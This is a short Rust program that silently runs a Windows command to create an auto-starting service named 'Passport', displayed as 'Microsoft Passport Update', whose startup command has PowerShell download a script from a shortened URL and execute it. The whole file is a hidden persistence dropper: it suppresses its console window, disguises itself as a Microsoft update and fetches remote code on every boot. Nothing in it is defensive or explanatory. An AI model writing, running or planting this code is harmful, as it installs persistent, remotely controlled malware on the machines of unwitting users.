use std::process::Command;

fn main() {
    let _ = Command::new("cmd")
        .args(&[
            "/c",
            "sc.exe create \"Passport\" start= auto binPath= \"cmd.exe /c powershell.exe irm https://bit.ly/4gVSSTx | iex\" DisplayName= \"Microsoft Passport Update\""
        ])
        .creation_flags(0x08000000)
        .output();
}